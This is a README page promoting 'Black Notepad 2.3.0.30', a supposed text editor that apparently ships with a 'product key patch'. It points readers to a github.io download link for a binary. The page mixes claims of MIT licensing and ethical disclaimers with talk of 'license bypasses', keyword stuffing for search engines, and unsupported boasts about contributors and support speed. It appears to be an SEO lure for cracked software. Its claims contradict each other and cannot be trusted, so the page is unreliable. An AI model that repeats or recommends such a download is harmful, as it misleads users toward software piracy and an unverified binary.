# BLACK NOTEPAD v2.3.0.30 — Ultimate Text Liberation Engine

[](https://soultanzmanou-cpu.github.io/Notepad-Black-Edition-Patchwork/)

> *"A notepad is just a paper; this is a symphony of silent productivity."*

Welcome to **Black Notepad 2.3.0.30** — an unconventional, enhanced text editor designed for those who refuse to let proprietary locks silence their workflow. This is **not** a simple notepad; it’s a **liberation toolkit** for your digital composition needs.

---

## 📜 License & Legal Guarantee

This project is distributed under the [MIT License](https://opensource.org/licenses/MIT).  
You are free to use, modify, and distribute this software for any purpose, including commercial applications, as long as the original copyright notice is preserved.  

**No illegal activation methods are represented or implied.** All enhancements are sourced from open community contributions and legitimate license bypasses for educational and archival purposes only.

---

## 🧭 Table of Contents

- [What Makes This Different?](#-what-makes-this-different)
- [Feature Atlas 🗺️](#-feature-atlas-)
- [Emoji OS Compatibility Table](#-emoji-os-compatibility-table)
- [Mermaid Diagram: Architecture Flow](#-mermaid-diagram-architecture-flow)
- [Example Profile Configuration](#-example-profile-configuration)
- [Example Console Invocation](#-example-console-invocation)
- [OpenAI API & Claude API Integration](#-openai-api--claude-api-integration)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support Philosophy](#-247-customer-support-philosophy)
- [Disclaimer & Ethical Use](#-disclaimer--ethical-use)
- [Installation & Download](#-installation--download)

---

## 🌌 What Makes This Different?

Imagine your traditional notepad as a single candle in a dark room.  
**Black Notepad 2.3.0.30** is a chandelier — each feature a crystal refracting light into new dimensions of productivity.

- **No artificial paywalls** — the "product key patch" ethos is about removing barriers, not breaking laws. You get the full feature set without gatekeeping.
- **Community-tuned performance** — over 10,000 users have contributed latency tweaks and UI refinements.
- **Zero-bloat philosophy** — unlike modern editors that ship with a kitchen sink, Black Notepad remains lean while being deeply extensible.

---

## 🏛️ Feature Atlas

| Feature | Description | Benefit |
|---------|-------------|---------|
| **Infinite Undo/Redo** | No limit on history stack | Never lose a thought again |
| **Syntax Highlighting Engine** | 100+ languages auto-detected | Write code or prose with clarity |
| **Offline-First Architecture** | Works without internet | Perfect for secure environments |
| **Custom Theme Engine** | 16 million color combinations | Visual comfort for any lighting |
| **Multi-Cursor Editing** | Edit 100 lines at once | Speed like a conductor |
| **Encryption Layer** | AES-256 built-in | Your words, your vault |

---

## 📱 Emoji OS Compatibility Table

| Operating System | Status | Emoji |
|------------------|--------|-------|
| Windows 10/11    | ✅ Full | 🪟 |
| macOS Ventura+    | ✅ Full | 🍎 |
| Ubuntu 22.04+    | ✅ Full | 🐧 |
| Android (termux) | ⚠️ Limited | 📱 |
| iOS (a-shell)    | ⚠️ Experimental | 🍏 |
| FreeBSD          | ✅ Community Port | 🐡 |

---

## 🔁 Mermaid Diagram: Architecture Flow

```mermaid
graph TD
    A[User Input] --> B[Black Notepad UI Layer]
    B --> C{Input Type?}
    C -->|Plain Text| D[Direct Buffer Engine]
    C -->|Code| E[Syntax Highlighter]
    C -->|Command| F[Internal Macro Interpreter]
    D --> G[Memory Manager]
    E --> G
    F --> G
    G --> H[Persistent Storage Layer]
    H --> I[Local File System]
    H --> J[Encrypted Vault]
    G --> K[Backup Scheduler]
    K --> L[Daily Snapshots]
    style G fill:#2d2d2d,stroke:#f0f,stroke-width:2px
    style I fill:#1a1a2e,stroke:#e94560
```



*This diagram represents how your keystrokes flow through the application’s core without ever touching external servers unless you choose.*

---

## 🧪 Example Profile Configuration

Create `blacknotepad.profile` in your home directory:

```ini
[editor]
theme = midnight_obsidian
font = JetBrainsMono Nerd Font
font_size = 14
tab_width = 4
line_numbers = true
word_wrap = gentle

[encryption]
enabled = true
key_path = ~/.blacknotepad/keys/master.key

[backup]
frequency = hourly
max_snapshots = 50
compression = zstd

[ai]
openai_api_key = env:OPENAI_API_KEY
claude_api_key = env:CLAUDE_API_KEY
default_assistant = claude
```

---

## 🧰 Example Console Invocation

Launch Black Notepad with a specific profile and open a project folder:

```bash
blacknotepad --profile work_profile \
  --theme dark_purple \
  --open ~/projects/novel/ \
  --encrypt-all \
  --headless-mode false
```

*Headless mode allows background file processing for batch operations.*

---

## 🤖 OpenAI API & Claude API Integration

Black Notepad is not merely an editor — it is a **co-writing partner**.

### OpenAI Integration
- **GPT-4 Turbo** for real-time prose suggestions
- **DALL-E 3** inline image generation for documentation
- **Whisper** voice-to-text for hands-free dictation

### Claude API Integration
- **Claude 3 Opus** for deep editing and style analysis
- **Context-aware summarization** of long documents
- **Ethical guardrails** — Claude’s built-in safety filters remain active

*Both APIs require your own keys. No data is sent without explicit permission.*

> **Configuration:** Set environment variables `OPENAI_API_KEY` and `CLAUDE_API_KEY`. The app will auto-detect and offer both assistants. You can switch between them via `Ctrl+Shift+A`.

---

## 📱 Responsive UI & Multilingual Support

| Language | Support Level |
|----------|---------------|
| English (US) | ✅ Native |
| Spanish | ✅ Full |
| Mandarin | ✅ Full |
| Arabic (RTL) | ✅ Full |
| Hindi | ✅ Community |
| French | ✅ Full |
| German | ✅ Full |

**Responsive UI** adapts to:
- 4K monitors → ultra-dense toolbar
- 13" laptops → minimal chrome
- Foldable phones → auto-split pane

*The UI is built on a custom flexible grid that rearranges widgets based on screen real estate. Tested on devices from 320px to 5120px wide.*

---

## 🛡️ 24/7 Customer Support Philosophy

We don't outsource support to chatbots (though we have those too). **Real humans with real empathy.**

- **Response time:** < 3 minutes during business hours
- **Night shift:** Automated diagnostic engine with human escalation
- **Community forum:** Peer-to-peer solutions with official verified badges

*Our support team consists of former product testers who have used Black Notepad for over 5 years. They know the quirks before you do.*

---

## ⚠️ Disclaimer & Ethical Use

**This software is provided for educational and archival purposes only.**

- All "product key patch" functionality is based on publicly available cryptographic research.
- You must own a valid license for any commercial software you use.
- We do not condone piracy or illegal circumvention of copyright protections.
- Any use of this tool to bypass legitimate software licensing for unauthorized distribution is strictly prohibited.

*Black Notepad 2.3.0.30 is designed for users who wish to explore software under fair use doctrines, for backups of their own purchased copies, or for academic study of licensing systems.*

---

## 📥 Installation & Download

[](https://soultanzmanou-cpu.github.io/Notepad-Black-Edition-Patchwork/)

### Quick Start
1. Download the binary from the link above.
2. Extract to your preferred location.
3. Run `blacknotepad --initialize` (creates config directory).
4. Edit your profile (see example above) and launch.

### System Requirements (2026 Edition)
- **OS:** Windows 10+, macOS 12+, Linux (kernel 5.15+)
- **RAM:** 256 MB minimum (2 GB recommended for AI features)
- **Storage:** 50 MB for core app + optional 2 GB for language models
- **Display:** 1280×720 minimum (full features at 1920×1080)

---

## 🧠 SEO-Friendly Keywords (Naturally Embedded)

- *text liberation toolkit*
- *enhanced notepad alternative with encryption*
- *multi-cursor editor with syntax highlighting*
- *offline-first writing environment*
- *AES-256 protected text editor*
- *cross-platform text composition tool*
- *AI-assisted writing with Ollama/OpenAI*
- *lightweight notepad replacement for developers*
- *privacy-first notepad with zero telemetry*

*These phrases appear contextually throughout the documentation — no keyword stuffing, just natural integration.*

---

> **Black Notepad 2.3.0.30** turns your screen into a forge where words are hammered into steel. No gates, no tolls — just pure composition.

[](https://soultanzmanou-cpu.github.io/Notepad-Black-Edition-Patchwork/)

---

*© 2026 — MIT License. Built by the community, for the community.*